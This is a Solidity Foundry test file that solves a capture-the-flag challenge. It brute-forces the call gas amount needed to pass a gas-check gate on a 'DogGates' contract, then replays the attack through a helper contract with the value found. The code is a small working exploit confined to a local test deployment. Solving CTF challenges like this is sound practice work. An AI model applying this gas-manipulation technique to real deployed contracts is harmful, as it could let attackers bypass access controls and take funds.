// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "../src/CTF4.sol";
import "../src/CTF4_counter.sol";
import "../lib/forge-std/src/Test.sol";
import "../lib/openzeppelin-contracts/contracts/utils/Strings.sol";

contract CTF4_Testing is Test{
    DogGates gates;
    theKeys keys;
    address us = address(65734653);

    event gasTestedTest(uint256 gas);

    function _testFindGasAmount() public{
        // Initialize contracts
        gates = new DogGates();
        keys = new theKeys(address(gates));


        // Try to enter the gates
        for(uint gasAmount = 26000; gasAmount <30000; gasAmount = gasAmount + 1){
            vm.startPrank(us);
            vm.expectRevert(bytes("GAS")); // when the revert isn't activated it's because the correct gas was found and the test will fail
            (bool success, ) = address(keys).call{gas: gasAmount}(abi.encodeWithSignature("openGates()"));
            assertTrue(success, Strings.toString(gasAmount));
            emit gasTestedTest(gasAmount);
            vm.stopPrank();
            // 9614 is the base solution
        }

    }

    function _testAttack() public{
        // Initialize contracts
        gates = new DogGates();
        vm.prank(us);
        keys = new theKeys(address(gates));

        uint256 gasAmount = 26256;

        // Try to enter the gates
        vm.startPrank(us);
        (bool success, ) = address(keys).call{gas: gasAmount}(abi.encodeWithSignature("openGates()"));
        require(success);
        vm.stopPrank();
    }

}
